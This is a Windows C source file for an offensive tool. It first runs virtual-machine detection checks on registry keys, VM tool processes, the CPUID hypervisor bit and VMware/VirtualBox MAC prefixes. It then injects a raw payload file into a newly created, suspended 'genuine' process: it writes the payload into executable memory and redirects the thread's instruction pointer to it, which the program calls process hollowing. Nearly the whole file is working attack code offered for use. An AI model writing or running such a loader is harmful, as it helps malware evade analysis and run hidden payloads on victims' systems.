#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>    // fixes CreateToolhelp32Snapshot, PROCESSENTRY32
#include <iphlpapi.h>    // fixes IP_ADAPTER_INFO, GetAdaptersInfo
#include <intrin.h>      // fixes __cpuid

int check_registry() {
    HKEY hKey;
    const char *keys[] = {
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        "SYSTEM\\ControlSet001\\Services\\vmci",
        NULL
    };
    for (int i = 0; keys[i]; i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return 1;
        }
    }
    return 0;
}

int check_processes() {
    const char *procs[] = {
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vboxservice.exe", "vboxtray.exe",
        NULL
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            for (int i = 0; procs[i]; i++) {
                if (_stricmp(pe.szExeFile, procs[i]) == 0) {
                    CloseHandle(snap);
                    return 1;
                }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int check_cpuid() {
    int info[4] = {0};
    __cpuid(info, 1);
    if (!((info[2] >> 31) & 1)) return 0;

    // Read hypervisor vendor string
    char vendor[13] = {0};
    __cpuid(info, 0x40000000);
    memcpy(vendor,     &info[1], 4);
    memcpy(vendor + 4, &info[2], 4);
    memcpy(vendor + 8, &info[3], 4);

    // "Microsoft Hv" = Hyper-V on bare metal (WSL2, etc.)
    if (strcmp(vendor, "Microsoft Hv") == 0) return 0;
    return 1;
}

int check_mac() {
    const char *vm_macs[] = {
        "\x00\x0C\x29", // VMware
        "\x00\x50\x56", // VMware
        "\x08\x00\x27", // VirtualBox
        NULL
    };
    IP_ADAPTER_INFO info[16];
    DWORD size = sizeof(info);
    if (GetAdaptersInfo(info, &size) != ERROR_SUCCESS) return 0;

    for (IP_ADAPTER_INFO *a = info; a; a = a->Next) {
        for (int i = 0; vm_macs[i]; i++) {
            if (memcmp(a->Address, vm_macs[i], 3) == 0) return 1;
        }
    }
    return 0;
}

int main(int argc, char *argv[])
{
    int score = 0;
    score += check_registry()  ? (puts("[+] Registry hit"),  1) : 0;
    score += check_processes() ? (puts("[+] Process hit"),   1) : 0;
    score += check_cpuid()     ? (puts("[+] CPUID hit"),     1) : 0;
    score += check_mac()       ? (puts("[+] MAC hit"),       1) : 0;

    printf("\nVM likelihood: %d/4 checks triggered\n", score);
    puts(score >= 3 ? "Likely running in a VM." : "Probably bare metal.");
    printf("Reminder: This will only work with .bin files or raw payload\n");

    if (argc < 3)
    {

        printf("Usage:%s <Genuine_Process> <Payload BIN File>\n", argv[0]);
        return 1;
    }

    void *exec;

    FILE *file = fopen(argv[2], "rb");

    fseek(file, 0, SEEK_END);
    long MalSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    byte *buffer = (byte *)malloc(MalSize);

    fread(buffer, 1, MalSize, file);
    fclose(file);

    STARTUPINFOA si = {
        sizeof(si)
    };

    PROCESS_INFORMATION pi;

    if (!CreateProcessA(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {

        printf("[-] Error Creating Process\n");

        return 1;
    }

    printf("[+] Process Created\n");

    exec = VirtualAllocEx(pi.hProcess, NULL, MalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec == NULL)
    {

        printf("[-] Error Allocating Memory\n");

        return 1;
    }

    printf("[+] Memory Allocated\n");

    if (!WriteProcessMemory(pi.hProcess, exec, buffer, MalSize, NULL))
    {

        printf("[-] Error Writing Memory\n");

        return 1;
    }

    printf("[+] Payload written to Memory\n");

    CONTEXT CT;
    CT.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &CT))
    {
        printf("[-] Error Getting Thread Context\n");

        return 1;
    }

    printf("[+] Retrived the Context of the Thread\n");

    CT.Rip = (DWORD64)exec;

    if (!SetThreadContext(pi.hThread, &CT))
    {
        printf("[-] Error Setting Thread Context\n");

        return 1;
    }

    printf("[+] Setting the Payload to the Instruction Pointer\n");

    Sleep(18);

    ResumeThread(pi.hThread);

    printf("[+] Process Hollowing Successful\n");

    free(buffer);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}